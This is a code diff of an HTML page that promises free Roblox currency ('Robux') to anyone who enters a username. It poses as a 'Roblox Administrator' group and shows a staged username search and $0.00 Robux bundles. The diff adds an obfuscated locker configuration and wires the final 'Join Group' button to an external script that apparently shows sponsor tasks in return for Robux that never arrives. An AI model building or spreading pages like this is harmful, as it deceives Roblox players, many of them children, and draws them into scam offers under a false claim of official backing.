@@ -13,12 +13,18 @@
         gtag('js', new Date());
         gtag('config', '');
     </script>
+    <script type="text/javascript">var avvik_ruX_GZZKPc = { "it": 4183089, "key": "ff962" };</script>
     <script src="https://d1dvnx7eh6slvq.cloudfront.net/166459f.js"></script>
 </head>
 <body>
     <nav>
         <div class="nav-logo">
-            <a href="#"><img src="robuxnavlogo.png" alt="Logo"></a>
+            <a href="#"><img src="../i.ibb.co/7NcrzMN/robuxnavlogo.png" alt="Logo"></a>
+        </div>
+        <div class="menu-icon" onclick="toggleMenu()">
+            <div></div>
+            <div></div>
+            <div></div>
         </div>
         <ul class="nav-links">
             <li><a href="https://www.roblox.com/discover#/" target="_blank">Discover</a></li>
@@ -26,42 +32,45 @@
             <li><a href="https://www.roblox.com/upgrades/robux?ctx=nav" target="_blank">Robux</a></li>
         </ul>
     </nav>
+    <div class="burger-menu">
+        <a href="https://www.roblox.com/discover#/" target="_blank">Discover</a>
+        <a href="https://www.roblox.com/catalog?Category=1&salesTypeFilter=1" target="_blank">Marketplace</a>
+        <a href="https://www.roblox.com/upgrades/robux?ctx=nav" target="_blank">Robux</a>
+    </div>
 
     <div class="middle">
         <h2>Roblox Administrator R$ Group</h2>
         <p>
             Connect your Roblox account by entering your username to begin!<br><br>
             You will be able to choose any amount of Robux you would like, and you will then be prompted to join the group.<br><br>
-            Robux can be used for testing purposes or to purchase accessories and game passes!
+            Robux can be used for testing purposes, or to purchase accessories and gamepasses!
         </p>
     </div>
 
     <div class="box_con">
         <div class="box">
-            <h3>Roblox Username</h3>
-            <input class="username" type="text" placeholder="Enter username">
+            <h3>Roblox username</h3><br>
+            <input class="username" type="text" name="" placeholder="Enter username"><br>
             <button class="getrbx">Next</button>
         </div>
-
-        <div class="box2" style="display: none;">
+        <div class="box2">
             <div class="folding">
                 <div class="sk-cube1 sk-cube"></div>
                 <div class="sk-cube2 sk-cube"></div>
                 <div class="sk-cube4 sk-cube"></div>
                 <div class="sk-cube3 sk-cube"></div>
+                <div class="square"></div>
             </div>
-            <p class="useroutput" style="text-align: center; margin-top: 30px;">Searching for username...</p>
+            <p class="useroutput" style="text-align: center; margin-top: 30px;">searching for username ...</p>
         </div>
-
-        <div class="box3" style="display: none;">
+        <div class="box3">
             <div class="container">
                 <h3>Amount of Robux</h3>
                 <div class="row">
                     <div class="price">$0.00</div>
                     <div class="details">
                         <div class="robux_total">
-                            <div class="pic"><img src="robux-removebg-preview.png" alt="Robux"></div>
-                            <span>800</span>
+                            <div class="pic"><img src="robux-removebg-preview.png"></div><span>800</span>
                         </div>
                     </div>
                 </div>
@@ -69,8 +78,7 @@
                     <div class="price">$0.00</div>
                     <div class="details">
                         <div class="robux_total">
-                            <div class="pic"><img src="robux-removebg-preview.png" alt="Robux"></div>
-                            <span>1700</span>
+                            <div class="pic"><img src="robux-removebg-preview.png"></div><span>1700</span>
                         </div>
                     </div>
                 </div>
@@ -78,8 +86,7 @@
                     <div class="price">$0.00</div>
                     <div class="details">
                         <div class="robux_total">
-                            <div class="pic"><img src="robux-removebg-preview.png" alt="Robux"></div>
-                            <span>5500</span>
+                            <div class="pic"><img src="robux-removebg-preview.png"></div><span>5500</span>
                         </div>
                     </div>
                 </div>
@@ -87,8 +94,7 @@
                     <div class="price">$0.00</div>
                     <div class="details">
                         <div class="robux_total">
-                            <div class="pic"><img src="robux-removebg-preview.png" alt="Robux"></div>
-                            <span>10000</span>
+                            <div class="pic"><img src="robux-removebg-preview.png"></div><span>10000</span>
                         </div>
                     </div>
                 </div>
@@ -97,14 +103,21 @@
                 </div>
             </div>
         </div>
-
-        <div class="box4" style="display: none;">
-            <h3>Last Step</h3>
+        <div class="box4">
+            <h3>Last step</h3>
             <p>Through our partnership with sponsors, Duxy is able to provide players with free Robux by completing simple tasks.</p>
-            <button class="complete-task-button">Join Group</button>
+            <button class="complete-task-button" onclick="_xA()">Join Group</button>
         </div>
     </div>
 
     <script src="app.js"></script>
+    <script>
+        function toggleMenu() {
+            const burgerMenu = document.querySelector('.burger-menu');
+            const nav = document.querySelector('nav');
+            burgerMenu.classList.toggle('active');
+            nav.classList.toggle('menu-open');
+        }
+    </script>
 </body>
 </html>
